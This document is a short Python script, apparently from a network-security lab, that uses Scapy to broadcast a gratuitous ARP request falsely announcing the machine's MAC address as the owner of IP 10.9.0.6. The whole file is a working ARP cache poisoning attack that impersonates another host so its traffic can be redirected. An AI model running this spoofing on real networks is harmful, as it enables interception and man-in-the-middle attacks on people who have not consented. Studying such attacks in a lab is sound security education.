#!/usr/bin/env python3
from scapy.all import *

attacker_mac = get_if_hwaddr("eth0")
fake_ip = "10.9.0.6"        # We're pretending to be this IP (B)

# Gratuitous ARP: we are 10.9.0.6, broadcasting that info
arp = ARP(op=1,              # ARP Request type
          hwsrc=attacker_mac,
          psrc=fake_ip,
          hwdst="00:00:00:00:00:00",
          pdst=fake_ip)

eth = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = eth / arp

sendp(packet)
